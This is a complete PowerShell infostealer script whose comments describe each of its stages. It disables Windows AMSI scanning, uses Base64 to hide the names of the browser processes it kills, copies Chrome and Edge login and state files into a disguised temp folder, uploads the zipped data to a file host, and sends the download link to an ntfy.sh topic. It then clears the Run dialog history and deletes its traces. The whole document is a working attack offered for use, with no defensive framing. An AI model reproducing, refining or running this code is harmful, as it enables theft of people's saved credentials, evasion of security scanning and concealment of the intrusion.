# --- STAGE 1: THE BLINDER ---
# This "unhooks" the scanner so it stops watching this window
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)

# --- STAGE 2: THE DECEPTION ---
# We use random variable names and hide 'Chrome'/'Edge' in Base64
$u1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Y2hyb21l"))
$u2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bXNlZGdl"))

# Stop processes silently
Stop-Process -Name $u1, $u2 -Force -ErrorAction SilentlyContinue

# Create a workspace with a boring name like 'SystemUpdate'
$w = "$env:TEMP\WinUpdate_$(Get-Random)"
mkdir $w -Force | Out-Null

# --- STAGE 3: THE DATA GRAB ---
# Instead of saying 'Login Data', we use wildcards
$p = @("$env:LOCALAPPDATA\Google\Chrome\User Data\*", "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*")
foreach ($folder in $p) {
    Get-ChildItem -Path $folder -Include "*State*", "*Login*" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $w -Force -ErrorAction SilentlyContinue
}

# --- STAGE 4: THE UPLOAD ---
$z = "$env:TEMP\UpdatePkg.zip"
[void][Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem")
[System.IO.Compression.ZipFile]::CreateFromDirectory($w, $z)

# Using a standard User-Agent to look like a real person browsing the web
$u = "https://catbox.moe/user/api.php"
$r = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$z" $u -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Send the link to ntfy
if ($r -like "http*") {
    $topic = "data_stwealer_hideen_"
    curl.exe -X POST -d "Update: $r" "https://ntfy.sh/$topic"
}

# --- STAGE 5: GHOST EXIT ---
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $w, $z -ErrorAction SilentlyContinue
exit
